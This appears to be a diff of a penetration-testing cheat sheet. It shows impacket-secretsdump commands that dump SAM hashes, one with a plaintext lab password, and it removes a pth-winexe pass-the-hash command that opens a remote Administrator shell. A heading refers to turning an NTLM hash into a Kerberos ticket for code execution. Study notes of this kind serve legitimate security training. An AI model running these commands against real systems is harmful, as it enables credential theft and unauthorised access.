@@ -325,10 +325,6 @@ impacket-secretsdump -sam SAM(local SAM file) -system SYSTEM(local SYSTEM file) 
 impacket-secretsdump celia.almeda:7k8XHk3dMtmpnC7@10.10.96.142 -sam SAM -system SYSTEM -outputfile /home/kali/Desktop/admin_hash.txt
 impacket-secretsdump celia.almeda@10.10.96.142 -sam SAM -system SYSTEM -outputfile /home/kali/Desktop/admin_hash.txt -hashes lm:nt
 ```
-#### Other Tools
-```
-pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd (winexesvc service)
-```
 
 #### Converted NTLM hash into a Kerberos TGT and leveraged that to gain remote code execution
 https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
